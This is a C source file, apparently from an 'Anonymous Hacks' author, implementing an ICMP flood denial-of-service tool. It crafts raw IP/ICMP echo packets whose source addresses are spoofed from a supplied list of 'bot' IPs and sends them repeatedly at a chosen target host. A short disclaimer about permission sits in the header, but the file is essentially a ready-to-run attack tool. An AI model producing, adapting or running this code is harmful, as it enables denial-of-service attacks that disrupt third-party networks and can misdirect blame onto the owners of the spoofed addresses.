/**
**** author: 4anonz(Anonymous Hacks)
**** description: This is a C program that implements the theory of the DDoS ICMP flood attack
**** discplaimer: Do not use this tool on any network you don't have permission to.
**** By using this tool you agree that you'll be helt responsible for any damage caused
**/
#include "util.h"
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <stdio.h>

#define PACKT_SIZE 6559

char bots[5049][100] = {};
int lines = 0, counter = 0, packet_num, ec = 0;
void *icmp_flood_thread(void *);

void icmp_flood(struct sockaddr_in *dest_addr, char *spoof_ip){


    char packet[4097], data[PACKT_SIZE];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip_header = (struct iphdr*)packet;
    struct icmphdr *icmp_header = (struct icmphdr*)(packet + sizeof(struct ip));

    //Generate a random id for this packet
    int id = random_range(213, 95843);
    int i = 0;
    for(; i < PACKT_SIZE-1; i++)
        data[i] = i + '0';
    
    data[i] = 0;
    int tot_len = sizeof(struct ip) + sizeof(struct icmphdr) + strlen(data);
    //IP HEADER
    ip_header->ihl = 5;                            //The ip header length
    ip_header->version = 4;                        //The ip version(IPv4)
    ip_header->tos = 0;                            //Type of service
    ip_header->tot_len = tot_len;                  //Total length
    ip_header->id = htons(id);                     //Packet id
    ip_header->frag_off = 0;                       //Fragment off
    ip_header->ttl = 255;                          //Time to leave
    ip_header->protocol = IPPROTO_ICMP;            //Protocol
    ip_header->check = 0;                          //Checksum
    ip_header->saddr = inet_addr(spoof_ip);        //Source ip address
    ip_header->daddr = dest_addr->sin_addr.s_addr; //Destination ip address

    ip_header->check = checksum(&packet, tot_len);  //Checksum

    //Generate a random ID and sqence number for this ICMP packet
    int icmpID = random_range(222, 99995);
    int seq = random_range(100, 1000245);

    //ICMP HEADERS
    icmp_header->type = ICMP_ECHO;                   // ICMP ECHO request
    icmp_header->code = htons(0);                    // code
    icmp_header->checksum = 0;                       // checksum
    icmp_header->un.echo.id = htons(icmpID);         // ICMP packet id
    icmp_header->un.echo.sequence = htons(seq);      // Sequence number
    icmp_header->checksum = checksum(&packet, sizeof(packet));

    // Create an ICMP raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(sock < 0) {
        fprintf(stderr, "%s[%sERROR%s]:%s Error creating socket %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }

    // Tell the kernal that headers are included in the packet
    int val = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val)) < 0) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to set socket option %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }

    if(sendto(sock, packet, tot_len, 0, 
            (struct sockaddr*)dest_addr, sizeof(*dest_addr)) < 0) {
        ec++;
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to send packet %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        if(ec == 5)
            exit(1);
    }
    counter++;
    close(sock);
}
void print_status(char *ip) {
    printf("%s[%sINFO%s]:%s Sending ICMP ping request.. using spoofed source ip %s[%s%s%s]%s (%d/%d)\n", 
    whi, gre, whi, res, whi, pur, ip, whi, res, counter, packet_num);
}
//The thread function
void *icmp_flood_thread(void *vargb) {
    struct sockaddr_in *d_addr = (struct sockaddr_in*)vargb;
    int index = random_range(0, lines);
    if(strlen(bots[index]) < 1)
        index -= 1;
    char *source_ip = bots[index];
    icmp_flood(d_addr, source_ip);
    print_status(source_ip);
    return NULL;
}

int main(int argc, char *argv[]) {
    srand(time(0));
    if(argc < 4) {
        printf("%s[%sCRITICAL%s]:%s Missing argument(s)...\n", whi, yel, whi, res);
        fprintf(stderr, "%sUsage:%s icmp_flood [target ip/hostname] [bots file] [number of packets]\n", whi, res);
        exit(1);
    }
    char *host = argv[1];
    char *bots_file = argv[2];
    packet_num = atoi(argv[3]);
    
    FILE *fp;
    char *tmp;
    int i = 0;

    //Open the file containing the botnets ip address and store them
    fp = fopen(bots_file, "r");
    if(fp == NULL) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to send packet %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }
    while(fgets(bots[i], sizeof(bots[i]), fp)) {
        if((tmp = strchr(bots[i], '\n')) != NULL)
            *tmp = '\0';
        i++;
        lines++;
    }
    fclose(fp);

    struct sockaddr_in addr_conn;
    //Resolve hostname to ip
    char *ip = dns_lookup(host, &addr_conn);
    if(ip == NULL) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to resolve hostname/ip '%s'\n",
        whi, red, whi, res, host);
        exit(1);
    }
    pthread_t thread_id;
    int k = 0;
    //Create threads for this attack.
    
    while(k < packet_num) {
        pthread_create(&thread_id, NULL, icmp_flood_thread, (void*)&addr_conn);
        pthread_join(thread_id, NULL);
        k++;
    }
    return 0;
}